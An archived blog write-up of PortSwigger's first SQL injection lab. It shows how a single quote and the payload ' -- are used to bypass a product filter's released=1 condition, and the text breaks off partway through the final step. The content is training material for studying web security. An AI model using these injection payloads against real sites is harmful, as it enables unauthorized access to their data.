# Lab-1 SQL-Injection PortSwigger WebSecurity

- **Source URL:** https://medium.com/@m75012439/lab-1-sql-injection-portswigger-websecurity-5759978da661?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126142030/https://medium.com/@m75012439/lab-1-sql-injection-portswigger-websecurity-5759978da661
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1931 (id 1931)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Lab-1 SQL-Injection PortSwigger WebSecurity

Task: Make a sql injection to retreive all products data

released and non-released

The browser request this url:

`https://insecure-website.com/products?category=Gifts`
The query which the browser send:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
## Analysis:

step:1

trying to know if work with sql or not:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
if we replace Gifts with ‘ the server will return

error if works with sql

`SELECT * FROM products WHERE category = ''' AND released = 1`
result:

the server return error

know we have suspicious

that it have a sql injection

## step2:

let’s confirm our suspicious by trying a payload

if the payload response

then there are a sql injection

the payload: ‘ —

the malicious query:

`SELECT * FROM products WHERE category = ''--' AND released = 1`
### How this payload work :

“ — “ it comments all the statments after it

so the query wil be like that:

`SELECT * FROM products WHERE category = ''`
### so let’s try the payload

result:

it response to the payload

so there are a sql injection

## step 3:

know to solve the task

we need to show all the categories data

non-released and released data

so the query we expect should be like that

`SELECT * FROM products ;`
OR
